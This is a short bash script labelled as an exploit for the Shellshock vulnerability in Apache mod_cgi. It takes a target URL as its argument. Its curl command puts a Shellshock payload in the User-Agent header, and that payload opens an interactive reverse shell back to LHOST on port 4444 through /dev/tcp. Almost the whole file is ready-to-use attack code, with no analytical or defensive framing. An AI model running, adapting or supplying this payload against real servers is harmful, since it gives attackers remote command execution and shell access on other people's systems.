#!/bin/bash
# exploit for shell-shock vulnerability 
# in apache mod_cgi 
# usage: 
#	./shellshock.sh <target url>
#

if [ -z "$1" ]
then 
	echo 'Provide targe url'
	exit
fi 

target=$1 


echo '[+] Sending Exploit to target $1'
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >&/dev/tcp/LHOST/4444 0>&1'" $target
echo '[+] Did it work?' 


